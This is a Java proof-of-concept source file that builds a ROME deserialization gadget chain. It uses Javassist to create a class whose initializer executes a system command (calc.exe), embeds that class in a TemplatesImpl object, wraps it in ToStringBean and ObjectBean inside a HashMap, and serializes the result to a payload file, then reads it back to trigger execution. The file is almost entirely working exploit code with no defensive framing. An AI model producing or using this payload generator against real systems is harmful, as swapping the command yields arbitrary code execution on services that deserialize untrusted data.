import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("i");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl templatesImpl = new TemplatesImpl();
        PocHelper.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        PocHelper.setFieldValue(templatesImpl, "_name", "a");
        PocHelper.setFieldValue(templatesImpl, "_tfactory", null);

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        Map hashMap = new HashMap();
        hashMap.put(objectBean, "x");

        PocHelper.setFieldValue(objectBean, "_cloneableBean", null);
        PocHelper.setFieldValue(objectBean, "_toStringBean", null);

        PocHelper.OutBase64Encode(hashMap);
        PocHelper.writeSer(hashMap,"ROME.ser");
        PocHelper.readSer("ROME.ser");
    }

}
